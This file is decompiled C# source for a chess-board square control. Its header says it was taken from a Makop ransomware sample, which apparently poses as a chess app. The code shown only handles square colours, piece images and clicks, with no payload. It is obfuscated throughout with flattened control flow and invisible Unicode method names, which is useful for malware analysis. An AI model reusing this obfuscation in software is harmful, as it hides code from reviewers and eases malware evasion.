// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: 司6, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E96108F1-63B0-49D9-ABCC-EB6314F0AFE2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-81e7927ab5ca518d06687dc18d5c4df22198011494322486e562136344d2513b.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = 1839366550;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1628240357)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              EventHandler<MouseEventArgs> comparand = eventHandler;
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u206A‏​⁯‎​‬‎​​‌‍‮⁪⁯⁭​‬‍⁬⁬‌‍​‫⁪⁭‮‍​‭‭‮‫​⁫⁭‏‫‌‮((Delegate) comparand, (Delegate) value), comparand);
              int num3;
              num1 = num3 = eventHandler != comparand ? 1839366550 : (num3 = 329259409);
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -2081616525;
        EventHandler<MouseEventArgs> eventHandler2;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1023384397)) % 5U)
          {
            case 0:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200C‬​‪‪⁯⁯​⁬​‮⁬⁮​⁫⁪​⁪‎‭⁬‬⁮‍⁬⁭‮‍‎‏⁭⁬‭‬⁮⁮‮⁮​‍‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * 832527326 ^ 1187133901;
              continue;
            case 1:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              int num3 = eventHandler1 == comparand ? 1276430277 : (num3 = 2060645659);
              num1 = num3 ^ (int) num2 * -707381673;
              continue;
            case 2:
              goto label_3;
            case 3:
              comparand = eventHandler1;
              num1 = -1868095122;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = -525721002;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1488546335)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -81126338 ^ -2117799403;
              continue;
            case 3:
              piece = this.piece;
              num1 = (int) num2 * 1381505985 ^ 217997503;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return piece;
      }
      set
      {
        this.piece = value;
        bool flag = this.piece == null;
label_1:
        int num1 = 607107852;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1135512346)) % 7U)
          {
            case 0:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u200F‮⁯‮‫⁫⁪⁫‬⁬⁮‫⁪‍‪⁮⁬‪⁬⁮​⁪‪⁪‬⁬⁯⁭‮‍‍⁭‬⁯‭‪⁮‍‏‪‮((Control) this, (Image) null);
              num1 = (int) num2 * -1299360517 ^ 832171981;
              continue;
            case 1:
              int num3 = !flag ? -967410108 : (num3 = -132709470);
              num1 = num3 ^ (int) num2 * 1014787178;
              continue;
            case 2:
              SimpleSquare.\u200F‮⁯‮‫⁫⁪⁫‬⁬⁮‫⁪‍‪⁮⁬‪⁬⁮​⁪‪⁪‬⁬⁯⁭‮‍‍⁭‬⁯‭‪⁮‍‏‪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = 1585340588;
              continue;
            case 3:
              num1 = (int) num2 * -1279893267 ^ -111566981;
              continue;
            case 4:
              goto label_1;
            case 5:
              num1 = (int) num2 * 130774840 ^ 1517485116;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public void colorSquare()
    {
label_1:
      int num1 = 627483500;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1747083794)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u200F​⁫‌‎⁪⁪‎‪‪‭⁪⁮‮⁭‎⁮‏‪‬⁬‍‪‌⁮⁯‪‬‌‎⁯‬​⁪⁪‌‍⁬⁯⁪‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -395682653 ^ 1188549889;
            continue;
          case 2:
            this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
            num1 = 1254277495;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public Pieces Kind
    {
      set
      {
label_1:
        int num1 = -1724659815;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1877998480)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              this.Piece.Kind = value;
              this.Piece = this.Piece;
              num1 = (int) num2 * 295742358 ^ -1947098188;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
label_1:
        int num1 = -266363920;
        bool isBlackSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2080223975)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              isBlackSquare = this.isBlackSquare;
              num1 = (int) num2 * -2075767877 ^ -1073619812;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isBlackSquare;
      }
      set
      {
label_1:
        int num1 = 1177828857;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 51105367)) % 5U)
          {
            case 0:
              num1 = (int) num2 * -1128114320 ^ -1670378434;
              continue;
            case 1:
              this.colorSquare();
              num1 = (int) num2 * -1626685672 ^ 1037497606;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              this.isBlackSquare = value;
              num1 = (int) num2 * 1944269126 ^ 213348974;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public Repository repo => ChessContext.repo;

    public SimpleSquare()
    {
      this.InitializeComponent();
      SimpleSquare.\u200B‫‫‍‮‪⁬⁮‏⁮⁬⁫‭‎⁯‍‮‪‏‍⁫⁫‏⁯⁫‌⁬‪⁪‌⁯‮‎​⁮‬⁮⁫⁫‏‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
      SimpleSquare.\u202A‍⁯⁮⁯​⁭‮⁭⁯‮⁯‏⁮‌‪​⁮‬‏⁪‬‍‍‫‌‪⁪‏‮‭‎⁯‮‬​​‬‌‪‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = -2033505270;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2110321635)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 398186483 ^ 250093412;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * 314272197 ^ -322484822;
              continue;
            }
            goto label_5;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public void HighLight()
    {
label_1:
      int num1 = -2009217598;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1724183104)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            SimpleSquare.\u200F​⁫‌‎⁪⁪‎‪‪‭⁪⁮‮⁭‎⁮‏‪‬⁬‍‪‌⁮⁯‪‬‌‎⁯‬​⁪⁪‌‍⁬⁯⁪‮((Control) this, Color.ForestGreen);
            num1 = (int) num2 * 1260932342 ^ -281557005;
            continue;
          case 3:
            num1 = (int) num2 * 1163620563 ^ 2075196004;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void ClearHighLight()
    {
label_1:
      int num1 = 1565980400;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 900743245)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -29826925 ^ -554882629;
            continue;
          case 1:
            SimpleSquare.\u200F​⁫‌‎⁪⁪‎‪‪‭⁪⁮‮⁭‎⁮‏‪‬⁬‍‪‌⁮⁯‪‬‌‎⁯‬​⁪⁪‌‍⁬⁯⁪‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -133423540 ^ -1835682911;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public bool IsEmpty
    {
      get
      {
        bool isEmpty = this.Piece == null;
label_1:
        int num1 = 2108130024;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 503609064)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 888943799 ^ -353587366;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -5166496;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ -835675254)) % 8U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u200C‏⁯‍‌⁭‎​⁯⁬‫⁪⁫‎‮‪‪‮‭‬⁬‭⁭‮‏⁪‌‫‭‮⁫⁬​⁪⁮‏‬‪‏‍‮((IDisposable) this.components);
            num1 = (int) num2 * 2053966311 ^ -1198030482;
            continue;
          case 2:
            if (disposing)
            {
              num1 = (int) num2 * 1114225514 ^ 1010065530;
              continue;
            }
            num3 = 0;
            break;
          case 3:
            num1 = (int) num2 * 2127898556 ^ -1442046077;
            continue;
          case 4:
            num3 = this.components != null ? 1 : 0;
            break;
          case 5:
            base.Dispose(disposing);
            num1 = -1366199014;
            continue;
          case 6:
            int num4 = !flag ? 197371313 : (num4 = 1197191965);
            num1 = num4 ^ (int) num2 * 1881287201;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_13;
        }
        flag = num3 != 0;
        num1 = -1572082420;
      }
label_3:
      return;
label_13:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = -1409534450;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1371498221)) % 25U)
        {
          case 0:
            SimpleSquare.\u202A⁮‬‍​‫‍⁮⁮‮‬‫‌‪‏‪‮‮‎⁭⁪⁪‌‬‎‬‪⁫⁭‭⁪⁬​⁯⁪⁫‭⁯‏‌‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 1565251983 ^ -1214543971;
            continue;
          case 1:
            SimpleSquare.\u202D⁫⁬‏‏‭‪‌‏⁫‭⁮‪⁬‏‏‭‪⁭⁫‬‭‏⁪⁮‍‍⁮‭‌‮⁬⁭‍‏⁬⁮⁭‫‌‮((Control) this.panel1, new Size(137, 132));
            num1 = (int) num2 * 1676463919 ^ 905309024;
            continue;
          case 2:
            this.panel1 = SimpleSquare.\u206C‏⁮‏‭⁪⁬⁫⁪‪‬‪⁮‮⁮‬‏‌‭‪‏‍⁬⁯​‏‎⁯‍⁯⁭‭⁯‪‫‬‍‬‏‮‮();
            num1 = (int) num2 * 1534108521 ^ -1462094092;
            continue;
          case 3:
            SimpleSquare.\u206F⁯‪⁫⁬⁬​⁬⁭⁪‮⁫‪⁮⁪‬‏⁪‪‍‪‎‌‭‍⁭⁮‏‪⁪‫‏‫‪⁮‌⁭‌⁭⁮‮((Control) this.panel1, \u003CModule\u003E.\u206E‭⁮​⁯⁫‫‮⁯‏‏‎‫⁬⁭‪‮‮⁬‭‌‬‏​‍‌‏‭⁪⁮‌⁫⁭⁭​‍‌‍‭‎‮<string>(2528756538U));
            num1 = (int) num2 * -639558917 ^ 596171419;
            continue;
          case 4:
            SimpleSquare.\u200C‮‪‮‮‭‍‮‬‫‬⁯‪‍⁬‮⁪⁭‍⁭⁮⁮‮‍⁯‎‮‎‏‫‬‏‌⁮‭‪‌‏‌⁫‮((Control) this, false);
            num1 = (int) num2 * 32758267 ^ -1775125430;
            continue;
          case 5:
            SimpleSquare.\u200F​⁫‌‎⁪⁪‎‪‪‭⁪⁮‮⁭‎⁮‏‪‬⁬‍‪‌⁮⁯‪‬‌‎⁯‬​⁪⁪‌‍⁬⁯⁪‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -556515183 ^ 2074825282;
            continue;
          case 6:
            num1 = (int) num2 * -1346260605 ^ 1612135236;
            continue;
          case 7:
            SimpleSquare.\u200C⁯⁪⁫‮‬‬‪‏‫⁫‮⁫‬⁮‭‏‎‌⁫‪⁮⁪⁪‍⁮‪‍‭‌​‎⁮‫‎‪‫‍⁫⁭‮((Control) this);
            num1 = (int) num2 * 2112327119 ^ 1362229200;
            continue;
          case 8:
            SimpleSquare.\u206F⁬⁯⁭‭⁯⁪‮‎⁪‍⁬‪‏⁫‭‬‬⁬‪⁫‏‍⁪‌‍‭‏‍⁪‬⁪⁭‌⁮‌‮‏‍‍‮((Control) this, new Padding(0));
            num1 = (int) num2 * -361974258 ^ -1240324283;
            continue;
          case 9:
            SimpleSquare.\u202B‌⁮⁮⁪‪‮‪‫‏‫⁬‏⁭‭⁭⁬‬​‎⁮⁪‪‮⁫‌‎​⁭‮‪‏⁮‫‏⁮​‏‌‍‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -842515133 ^ 932434684;
            continue;
          case 10:
            goto label_1;
          case 11:
            SimpleSquare.\u202E⁯⁮⁪‫‪‬⁯⁪⁮⁮‌‏⁯⁬⁮⁯⁬⁪‫‫‍‎‏​‭⁭⁮⁭‌‬​‫​‮‭⁫​‫⁫‮((Control) this, \u003CModule\u003E.\u200C‏‮‬‮⁭‎⁯‎‫‏⁬⁯⁬⁬‏‌‏⁪‬⁫‎‫⁮‮‎‎‏‮‎‭⁬‫⁯⁬⁭⁮‎‪‎‮<string>(3731469256U));
            num1 = (int) num2 * -976111225 ^ -1400908260;
            continue;
          case 12:
            SimpleSquare.\u202E​‌⁫‪‬‌⁫‎‏‌‬⁭‮‫⁪‭⁯⁭‌​‎‏⁯‎⁬‪‏​‪‮⁯⁭‮‌‭‎​‭‬‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -646737344 ^ -2069226676;
            continue;
          case 13:
            num1 = (int) num2 * -612195067 ^ -1411654276;
            continue;
          case 14:
            SimpleSquare.\u206D‫​‫‮‫‫⁬‍⁯‭‫⁬‍⁮‭‏‬‎​⁯‏‏⁭‪⁪‎⁪‍‫​⁮⁯‍⁯⁭‭‍⁭‌‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * -1476323477 ^ 147127874;
            continue;
          case 15:
            SimpleSquare.\u206D‭⁪‫‏‭‭⁯⁫‮‌⁬⁪⁮‏⁮⁮⁬⁬⁯⁬⁮⁮⁭​‮⁫‌‌‍⁭‌‍‬‪⁯‭‍‬‭‮(SimpleSquare.\u202E⁫⁪⁪‬‫‫⁭⁬⁮‍⁬⁬‭‍‬‫⁯⁫‏‬⁫⁪⁫‮‍‭‫‍⁮‮‏⁭⁯‍‍‭‭⁬‏‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * -366552255 ^ -777721247;
            continue;
          case 16:
            SimpleSquare.\u206F⁫‍‫‏‪‮‬‮‫​⁯‏⁫‬⁫‌⁮‍‍⁪⁬⁬‫‭‎‫⁯‭⁭‪‪‮⁬⁭⁪⁭‎‌‍‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 2116623509 ^ -1520168957;
            continue;
          case 17:
            goto label_3;
          case 18:
            num1 = (int) num2 * -2007543515 ^ -970355960;
            continue;
          case 19:
            num1 = (int) num2 * -1434731755 ^ -1862959906;
            continue;
          case 20:
            SimpleSquare.\u206C‏‫⁬‫⁮‏⁮‍⁪‫⁫⁭⁪‎⁫‏‮⁬​‎​‭⁬⁯⁪⁯⁯⁯‭‫⁭⁭‬‭‏‎​⁪‪‮((Control) this.panel1, 0);
            num1 = (int) num2 * 212761890 ^ -1860174282;
            continue;
          case 21:
            SimpleSquare.\u206E‍‫‭⁬⁯‫‬‮​⁮⁭⁪‎‭⁬‬‭‬⁪⁫‮⁭⁭‍⁮‮‍‪⁫⁬‏⁬⁫⁯‭⁪‌⁮⁮‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * 1724632570 ^ -1977159284;
            continue;
          case 22:
            num1 = (int) num2 * 290594219 ^ -1762371969;
            continue;
          case 23:
            SimpleSquare.\u202E​‌⁫‪‬‌⁫‎‏‌‬⁭‮‫⁪‭⁯⁭‌​‎‏⁯‎⁬‪‏​‪‮⁯⁭‮‌‭‎​‭‬‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * -1740406880 ^ -2031727322;
            continue;
          case 24:
            num1 = (int) num2 * 104797952 ^ 1545762722;
            continue;
          default:
            goto label_27;
        }
      }
label_3:
      return;
label_27:;
    }

    static Delegate \u206A‏​⁯‎​‬‎​​‌‍‮⁪⁯⁭​‬‍⁬⁬‌‍​‫⁪⁭‮‍​‭‭‮‫​⁫⁭‏‫‌‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u200C‬​‪‪⁯⁯​⁬​‮⁬⁮​⁫⁪​⁪‎‭⁬‬⁮‍⁬⁭‮‍‎‏⁭⁬‭‬⁮⁮‮⁮​‍‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200F‮⁯‮‫⁫⁪⁫‬⁬⁮‫⁪‍‪⁮⁬‪⁬⁮​⁪‪⁪‬⁬⁯⁭‮‍‍⁭‬⁯‭‪⁮‍‏‪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u200F​⁫‌‎⁪⁪‎‪‪‭⁪⁮‮⁭‎⁮‏‪‬⁬‍‪‌⁮⁯‪‬‌‎⁯‬​⁪⁪‌‍⁬⁯⁪‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u200B‫‫‍‮‪⁬⁮‏⁮⁬⁫‭‎⁯‍‮‪‏‍⁫⁫‏⁯⁫‌⁬‪⁪‌⁯‮‎​⁮‬⁮⁫⁫‏‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202A‍⁯⁮⁯​⁭‮⁭⁯‮⁯‏⁮‌‪​⁮‬‏⁪‬‍‍‫‌‪⁪‏‮‭‎⁯‮‬​​‬‌‪‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200C‏⁯‍‌⁭‎​⁯⁬‫⁪⁫‎‮‪‪‮‭‬⁬‭⁭‮‏⁪‌‫‭‮⁫⁬​⁪⁮‏‬‪‏‍‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206C‏⁮‏‭⁪⁬⁫⁪‪‬‪⁮‮⁮‬‏‌‭‪‏‍⁬⁯​‏‎⁯‍⁯⁭‭⁯‪‫‬‍‬‏‮‮() => new Panel();

    static void \u200C⁯⁪⁫‮‬‬‪‏‫⁫‮⁫‬⁮‭‏‎‌⁫‪⁮⁪⁪‍⁮‪‍‭‌​‎⁮‫‎‪‫‍⁫⁭‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202E​‌⁫‪‬‌⁫‎‏‌‬⁭‮‫⁪‭⁯⁭‌​‎‏⁯‎⁬‪‏​‪‮⁯⁭‮‌‭‎​‭‬‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u206E‍‫‭⁬⁯‫‬‮​⁮⁭⁪‎‭⁬‬‭‬⁪⁫‮⁭⁭‍⁮‮‍‪⁫⁬‏⁬⁫⁯‭⁪‌⁮⁮‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u202B‌⁮⁮⁪‪‮‪‫‏‫⁬‏⁭‭⁭⁬‬​‎⁮⁪‪‮⁫‌‎​⁭‮‪‏⁮‫‏⁮​‏‌‍‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u206F⁯‪⁫⁬⁬​⁬⁭⁪‮⁫‪⁮⁪‬‏⁪‪‍‪‎‌‭‍⁭⁮‏‪⁪‫‏‫‪⁮‌⁭‌⁭⁮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202D⁫⁬‏‏‭‪‌‏⁫‭⁮‪⁬‏‏‭‪⁭⁫‬‭‏⁪⁮‍‍⁮‭‌‮⁬⁭‍‏⁬⁮⁭‫‌‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206C‏‫⁬‫⁮‏⁮‍⁪‫⁫⁭⁪‎⁫‏‮⁬​‎​‭⁬⁯⁪⁯⁯⁯‭‫⁭⁭‬‭‏‎​⁪‪‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206F⁫‍‫‏‪‮‬‮‫​⁯‏⁫‬⁫‌⁮‍‍⁪⁬⁬‫‭‎‫⁯‭⁭‪‪‮⁬⁭⁪⁭‎‌‍‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u202A⁮‬‍​‫‍⁮⁮‮‬‫‌‪‏‪‮‮‎⁭⁪⁪‌‬‎‬‪⁫⁭‭⁪⁬​⁯⁪⁫‭⁯‏‌‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u202E⁫⁪⁪‬‫‫⁭⁬⁮‍⁬⁬‭‍‬‫⁯⁫‏‬⁫⁪⁫‮‍‭‫‍⁮‮‏⁭⁯‍‍‭‭⁬‏‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u206D‭⁪‫‏‭‭⁯⁫‮‌⁬⁪⁮‏⁮⁮⁬⁬⁯⁬⁮⁮⁭​‮⁫‌‌‍⁭‌‍‬‪⁯‭‍‬‭‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u206F⁬⁯⁭‭⁯⁪‮‎⁪‍⁬‪‏⁫‭‬‬⁬‪⁫‏‍⁪‌‍‭‏‍⁪‬⁪⁭‌⁮‌‮‏‍‍‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202E⁯⁮⁪‫‪‬⁯⁪⁮⁮‌‏⁯⁬⁮⁯⁬⁪‫‫‍‎‏​‭⁭⁮⁭‌‬​‫​‮‭⁫​‫⁫‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206D‫​‫‮‫‫⁬‍⁯‭‫⁬‍⁮‭‏‬‎​⁯‏‏⁭‪⁪‎⁪‍‫​⁮⁯‍⁯⁭‭‍⁭‌‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200C‮‪‮‮‭‍‮‬‫‬⁯‪‍⁬‮⁪⁭‍⁭⁮⁮‮‍⁯‎‮‎‏‫‬‏‌⁮‭‪‌‏‌⁫‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
